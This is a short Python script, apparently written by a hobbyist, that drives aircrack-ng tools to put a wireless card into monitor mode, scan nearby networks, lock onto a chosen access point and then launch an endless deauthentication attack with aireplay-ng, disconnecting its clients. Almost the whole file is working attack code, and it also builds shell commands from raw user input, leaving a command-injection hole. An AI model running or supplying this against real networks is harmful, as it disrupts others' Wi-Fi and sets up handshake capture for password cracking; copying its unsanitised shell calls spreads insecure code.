import os 

print('welcome to program by parth ')
print('---------------------------------------------------------------------')
q = input('press anything to continue')
print(q)

os.system('airmon-ng')
print('\n\n')

inter = input('enter the interface : ')
os.system('airmon-ng start {0}'.format(inter))
#b - input('press anything to continue :')

os.system('check kill')
#c = input('press snything to continue:')
interm = input('enter the interface  moniter mode : ')
os.system('airodump-ng {0}'.format(interm))

bssidi = input('enter the bssid of wifi : ')
chan = input('enter the channel number : ')
os.system('airodump-ng -c {0} --bssid {1} {2}'.format(chan,bssidi,interm))
#d = input('press anything to continue:')
print(bssidi)
print(chan)
print(interm)
os.system('aireplay-ng -0 0  -a {0} {1}'.format(bssidi,interm))


